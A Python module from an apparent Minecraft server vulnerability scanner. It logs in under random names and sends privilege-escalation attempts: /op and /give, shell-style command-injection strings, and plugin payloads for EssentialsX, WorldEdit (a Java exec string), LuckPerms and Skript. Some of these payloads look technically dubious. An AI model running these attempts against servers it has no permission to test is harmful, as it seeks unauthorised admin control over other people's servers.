
"""
Privilege Escalation module for MineScan
Checks for potential privilege escalation vulnerabilities in Minecraft servers
"""

import re
import time
import random
import socket
from typing import Dict, List, Optional

from exploits.client import MinecraftClient

class PrivilegeEscalationExploit:
    """Tests for privilege escalation vulnerabilities in Minecraft servers"""
    
    def __init__(self, host: str, port: int = 25565, timeout: int = 5):
        self.host = host
        self.port = port
        self.timeout = timeout
        
    def check_vulnerabilities(self) -> List[Dict]:
        """Perform all privilege escalation vulnerability checks"""
        vulnerabilities = []
        
        # Run specific privilege escalation checks
        auth_bypass_vulns = self._check_authentication_bypass()
        if auth_bypass_vulns:
            vulnerabilities.extend(auth_bypass_vulns)
        
        permission_vulns = self._check_permission_bypass()
        if permission_vulns:
            vulnerabilities.extend(permission_vulns)
            
        plugin_vulns = self._check_plugin_privilege_escalation()
        if plugin_vulns:
            vulnerabilities.extend(plugin_vulns)
            
        return vulnerabilities
    
    def _check_authentication_bypass(self) -> List[Dict]:
        """Check for authentication bypass vulnerabilities"""
        vulnerabilities = []
        
        # Create client for testing
        client = MinecraftClient(self.host, self.port, timeout=self.timeout)
        try:
            # Test basic connection
            if not client.connect():
                return []
                
            # Try UUID spoofing attack (common in some server setups)
            rand_username = f"test_user_{random.randint(1000, 9999)}"
            if client.login(rand_username):
                # If login successful, try commands that should require higher privileges
                for cmd in ["/op", "/gamemode 1", "/give", "/permissions"]:
                    response = client.send_command(cmd)
                    if response and not any(denied in response.lower() for denied in 
                                          ["denied", "don't have permission", "no permission", "not permitted"]):
                        vulnerabilities.append({
                            'type': 'auth_bypass',
                            'name': 'Authentication Privilege Escalation',
                            'description': f'Potential privilege escalation via authentication bypass: {cmd}',
                            'severity': 'CRITICAL',
                            'recommendation': 'Update authentication plugins and ensure proper permission validation'
                        })
                        # No need to check more commands if we found one that works
                        break
        finally:
            client.close()
            
        return vulnerabilities
    
    def _check_permission_bypass(self) -> List[Dict]:
        """Check for permission bypass vulnerabilities"""
        vulnerabilities = []
        
        # Create client for testing
        client = MinecraftClient(self.host, self.port, timeout=self.timeout)
        try:
            if not client.connect():
                return []
                
            # Try permission-based exploit techniques
            rand_username = f"admin_{random.randint(1000, 9999)}"
            if client.login(rand_username):
                # Test for command injection via chat
                injection_tests = [
                    "/help;/op",                        # Command chaining
                    "/help & /op",                      # Command chaining alternative
                    "/help || /op",                     # Logical OR bypass
                    "/help | /op",                      # Pipe bypass
                    "/help\n/op",                       # Newline bypass
                    "/help/*/../op",                    # Path traversal bypass
                    "/help$IFS/op",                     # IFS spacing bypass
                    "/help${IFS}/op",                   # Alternative IFS bypass
                    "/help%00/op",                      # Null byte injection
                    "/help/*//;\"/op",                  # Quote bypass
                    "/help/**//;&/op",                  # Complex bypass pattern
                ]
                
                for test in injection_tests:
                    response = client.send_command(test)
                    if response and "success" in response.lower() and not any(denied in response.lower() for denied in 
                                  ["denied", "don't have permission", "no permission", "not permitted"]):
                        vulnerabilities.append({
                            'type': 'permission_bypass',
                            'name': 'Permission Command Injection',
                            'description': f'Potential privilege escalation via command injection: {test}',
                            'severity': 'CRITICAL',
                            'recommendation': 'Update server software and implement proper command sanitization'
                        })
                        break
        finally:
            client.close()
            
        return vulnerabilities
        
    def _check_plugin_privilege_escalation(self) -> List[Dict]:
        """Check for plugin-specific privilege escalation vulnerabilities"""
        vulnerabilities = []
        
        # Common plugin privilege escalation vectors
        plugin_tests = [
            {
                'plugin': 'EssentialsX',
                'commands': ['/essentials:nick server', '/essentials:nick >&op', '/essentials:nick console'],
                'description': 'EssentialsX nickname command privilege escalation'
            },
            {
                'plugin': 'WorldEdit',
                'commands': [
                    '//calc .replace("a","").replace("b","").replace("class","").replace("java","").replace("io","").replace("system","").replace("exec","")+"java.io.System.exec(\'open -a Calculator\')"', 
                    '//calculate System.getProperty("os.name")'
                ],
                'description': 'WorldEdit calc/calculate command injection'
            },
            {
                'plugin': 'LuckPerms',
                'commands': ['/lp user default permission set * true', '/lp user default permission set luckperms.* true'],
                'description': 'LuckPerms permission manipulation'
            },
            {
                'plugin': 'Skript',
                'commands': ['/skript execute console command "op %player%"'],
                'description': 'Skript console command injection'
            }
        ]
        
        client = MinecraftClient(self.host, self.port, timeout=self.timeout)
        try:
            if not client.connect():
                return []
                
            rand_username = f"test_user_{random.randint(1000, 9999)}"
            if client.login(rand_username):
                for plugin_test in plugin_tests:
                    for cmd in plugin_test['commands']:
                        response = client.send_command(cmd)
                        if response and not any(denied in response.lower() for denied in 
                                       ["denied", "don't have permission", "no permission", "not permitted"]):
                            vulnerabilities.append({
                                'type': 'plugin_privesc',
                                'name': f"{plugin_test['plugin']} Privilege Escalation",
                                'description': plugin_test['description'],
                                'severity': 'CRITICAL',
                                'recommendation': f'Update {plugin_test["plugin"]} to the latest version and ensure proper permission configuration'
                            })
                            break
        finally:
            client.close()
            
        return vulnerabilities
